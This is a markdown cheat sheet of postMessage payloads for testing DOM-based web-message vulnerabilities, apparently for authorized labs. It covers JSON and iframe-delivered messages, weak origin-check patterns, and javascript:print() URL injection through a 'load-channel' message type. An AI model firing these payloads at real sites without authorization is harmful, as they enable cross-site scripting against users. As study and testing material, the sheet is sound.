# Web Message Payloads

## 1. Purpose

Payloads for testing:

```text
postMessage()
message events
event.data
event.origin
JSON.parse()
```

The basic flow is:

```text
Attacker Window
      ↓
postMessage()
      ↓
event.data
      ↓
Application Processing
      ↓
Sink
```

---

# 2. Basic String Message

```javascript
target.postMessage("TEST", "*");
```

Use this to determine whether the target receives Web Messages.

---

# 3. Marker Message

```javascript
target.postMessage("dommsg123", "*");
```

Use:

```text
dommsg123
```

as a unique marker.

Then inspect:

```javascript
event.data
```

---

# 4. JSON Message

If the application uses:

```javascript
JSON.parse(event.data)
```

send:

```javascript
target.postMessage(
    '{"type":"test","value":"dommsg123"}',
    "*"
);
```

---

# 5. `load-channel` Message

For applications expecting:

```text
type = load-channel
```

use:

```javascript
target.postMessage(
    '{"type":"load-channel","url":"https://example.com"}',
    "*"
);
```

---

# 6. JavaScript URL Test

In an authorized lab where the sink assigns a message-controlled URL to an iframe or navigation sink:

```javascript
target.postMessage(
    '{"type":"load-channel","url":"javascript:print()"}',
    "*"
);
```

---

# 7. iframe-Based Message

```html
<iframe
src="https://TARGET-LAB.example/"
onload='this.contentWindow.postMessage("TEST","*")'>
</iframe>
```

---

# 8. JSON iframe Payload

```html
<iframe
src="https://TARGET-LAB.example/"
onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"https://example.com\"}","*")'>
</iframe>
```

---

# 9. Lab `print()` Payload

```html
<iframe
src="https://TARGET-LAB.example/"
onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

---

# 10. Origin Inspection

Inside a message handler:

```javascript
window.addEventListener('message', function(event) {
    console.log(event.origin);
    console.log(event.data);
});
```

Use this during testing to understand:

```text
Sender Origin
Message Data
```

---

# 11. Origin Validation Tests

Test whether the application uses:

```javascript
event.origin === "https://trusted.example"
```

versus:

```javascript
event.origin.includes("trusted.example")
```

or:

```javascript
event.origin.startsWith("https://trusted.example")
```

or:

```javascript
event.origin.endsWith("trusted.example")
```

---

# 12. Message-Type Testing

If the application uses:

```javascript
switch(data.type)
```

test expected values such as:

```json
{"type":"test"}
```

```json
{"type":"load-channel"}
```

```json
{"type":"load"}
```

Only use values observed in the target application.

---

# 13. Property Testing

If the application expects:

```text
url
src
redirect
target
callback
```

test a benign controlled value:

```json
{"type":"test","url":"https://example.com"}
```

---

# 14. Message Mutation

Test:

```text
Missing property
Extra property
Unexpected type
Empty value
Null value
Unexpected URL
```

Examples:

```json
{"type":"test"}
```

```json
{"type":"test","url":""}
```

```json
{"type":"test","url":"https://example.com"}
```

---

# 15. Origin Checklist

```text
☐ event.origin identified
☐ Exact comparison checked
☐ indexOf() checked
☐ includes() checked
☐ startsWith() checked
☐ endsWith() checked
☐ Regex checked
☐ targetOrigin identified
☐ Sender controlled
☐ Message controlled
```

---

# 16. Web Message Checklist

```text
☐ Listener identified
☐ event.data identified
☐ Message format identified
☐ JSON.parse identified
☐ type identified
☐ Relevant property identified
☐ Origin validation checked
☐ Sink identified
☐ Controlled message sent
☐ Browser behavior confirmed
```

---

# Quick Payload List

```javascript
target.postMessage("TEST", "*");
```

```javascript
target.postMessage("dommsg123", "*");
```

```javascript
target.postMessage(
    '{"type":"test","value":"dommsg123"}',
    "*"
);
```

```javascript
target.postMessage(
    '{"type":"load-channel","url":"https://example.com"}',
    "*"
);
```

```javascript
target.postMessage(
    '{"type":"load-channel","url":"javascript:print()"}',
    "*"
);
```

---

# Final Rule

```text
postMessage()
    ↓
event.data
    ↓
MESSAGE PARSING
    ↓
ORIGIN VALIDATION
    ↓
APPLICATION LOGIC
    ↓
SINK
```